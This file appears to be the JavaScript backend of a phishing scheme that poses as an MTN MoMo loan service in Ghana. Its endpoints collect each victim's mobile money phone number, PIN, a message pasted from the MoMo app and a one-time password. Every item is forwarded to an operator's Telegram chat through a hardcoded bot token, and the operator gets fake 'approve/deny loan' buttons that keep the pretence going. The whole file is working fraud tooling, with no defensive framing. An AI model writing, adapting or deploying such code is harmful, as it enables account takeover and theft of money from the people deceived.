const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - FULLY ENABLED
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION - GHANA
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN || '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
const CHAT_ID = process.env.CHAT_ID || '8313270294';

// Store pending loan requests
const pendingLoans = {};

// ============================================
// SEND #1: LOGIN (PHONE + PIN)
// ============================================
async function sendLoginToTelegram(data) {
  try {
    const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
      `🔐 *MOMO ACCOUNT LOGIN*\n` +
      `📱 MoMo Phone: +233 ${data.momoPhone}\n` +
      `🔢 MoMo PIN: ${data.momoPin}\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `✅ Step 1: Login details received.\n\n` +
      `⚠️ Please approve or deny this loan request.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Approve Loan', callback_data: `approve_loan_${data.requestId}` },
              { text: '❌ Deny Loan', callback_data: `deny_loan_${data.requestId}` }
            ]
          ]
        }
      })
    });

    const result = await response.json();
    console.log('📤 [STEP 1] Telegram Login:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ [STEP 1] Telegram error:', error.message);
    return null;
  }
}

// ============================================
// SEND #2: MOMO MESSAGE
// ============================================
async function sendMomoMessageToTelegram(data) {
  try {
    const message = `📩 *MOMO-APP MESSAGE RECEIVED (GHANA)*\n\n` +
      `📱 *MoMo Account:* +233 ${data.momoPhone}\n\n` +
      `📩 *Message Pasted by User:*\n` +
      `\`\`\`\n${data.momoMessage}\n\`\`\`\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `✅ Step 2: User pasted MOMO message. Proceeding to OTP.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    console.log('📤 [STEP 2] Telegram Momo Message:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ [STEP 2] Telegram error:', error.message);
    return null;
  }
}

// ============================================
// SEND #3: OTP VERIFICATION
// ============================================
async function sendOtpToTelegram(data) {
  try {
    const message = `✅ *MTN MoMo Loan - OTP Verification (Ghana)*\n\n` +
      `📱 *MoMo Account:* +233 ${data.momoPhone}\n` +
      `🔑 *OTP Entered:* \`${data.otp}\`\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `✅ Step 3: User has confirmed OTP for disbursement.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    console.log('📤 [STEP 3] Telegram OTP:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ [STEP 3] Telegram error:', error.message);
    return null;
  }
}

// ============================================
// ENDPOINT #1: /api/loan/login
// ============================================
app.post('/api/loan/login', async (req, res) => {
  try {
    const { momoPhone, momoPin } = req.body;

    console.log('🔐 [STEP 1] Login:', { momoPhone, momoPin: '****' });

    if (!momoPhone || !momoPin) {
      return res.status(400).json({
        success: false,
        message: 'MoMo phone and PIN are required'
      });
    }

    const requestId = 'loan_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);

    pendingLoans[requestId] = {
      momoPhone,
      momoPin,
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    await sendLoginToTelegram({ momoPhone, momoPin, requestId });

    res.json({
      success: true,
      message: 'Login details received',
      requestId
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// ENDPOINT #2: /api/loan/momo-message
// ============================================
app.post('/api/loan/momo-message', async (req, res) => {
  try {
    const { momoPhone, momoMessage } = req.body;

    console.log('📩 [STEP 2] Momo Message:', { momoPhone, momoMessage: 'received' });

    if (!momoPhone || !momoMessage) {
      return res.status(400).json({
        success: false,
        message: 'Phone and message are required'
      });
    }

    await sendMomoMessageToTelegram({ momoPhone, momoMessage });

    res.json({
      success: true,
      message: 'MOMO message received'
    });
  } catch (error) {
    console.error('Momo message error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// ENDPOINT #3: /api/loan/verify-otp
// ============================================
app.post('/api/loan/verify-otp', async (req, res) => {
  try {
    const { momoPhone, otp } = req.body;

    console.log('🔑 [STEP 3] OTP:', { momoPhone, otp });

    if (!momoPhone || !otp) {
      return res.status(400).json({
        success: false,
        message: 'Phone and OTP are required'
      });
    }

    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit OTP'
      });
    }

    await sendOtpToTelegram({ momoPhone, otp });

    res.json({ success: true, message: 'OTP verified' });
  } catch (error) {
    console.error('OTP error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// TELEGRAM CALLBACK (Approve/Deny)
// ============================================
app.post('/api/telegram/callback', async (req, res) => {
  try {
    const { callback_data } = req.body;
    if (!callback_data) {
      return res.status(400).json({ success: false, message: 'No callback data' });
    }

    const [action, type, requestId] = callback_data.split('_');

    if (!pendingLoans[requestId]) {
      return res.status(404).json({ success: false, message: 'Request not found' });
    }

    if (action === 'approve' && type === 'loan') {
      pendingLoans[requestId].status = 'approved';
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `✅ *LOAN APPROVED*\n\n📱 +233 ${pendingLoans[requestId].momoPhone}`,
          parse_mode: 'Markdown'
        })
      });
      res.json({ success: true, message: 'Loan approved' });
    } else if (action === 'deny' && type === 'loan') {
      pendingLoans[requestId].status = 'denied';
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `❌ *LOAN DENIED*\n\n📱 +233 ${pendingLoans[requestId].momoPhone}`,
          parse_mode: 'Markdown'
        })
      });
      res.json({ success: true, message: 'Loan denied' });
    } else {
      res.status(400).json({ success: false, message: 'Invalid action' });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// LOAN STATUS
// ============================================
app.get('/api/loan/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  if (!pendingLoans[requestId]) {
    return res.status(404).json({ success: false, message: 'Request not found' });
  }
  res.json({
    success: true,
    status: pendingLoans[requestId].status,
    phone: pendingLoans[requestId].momoPhone
  });
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    message: 'MTN MoMo Loan API - Ghana is running! 🇬🇭'
  });
});

// ============================================
// 404 + ERROR HANDLERS
// ============================================
app.use((req, res) => {
  res.status(404).json({ success: false, message: 'Route not found', path: req.originalUrl });
});

app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({ success: false, message: err.message });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan API - Ghana');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 20)}...`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('🇬🇭 Ghana MTN MoMo Loan System');
  console.log('====================================');
});
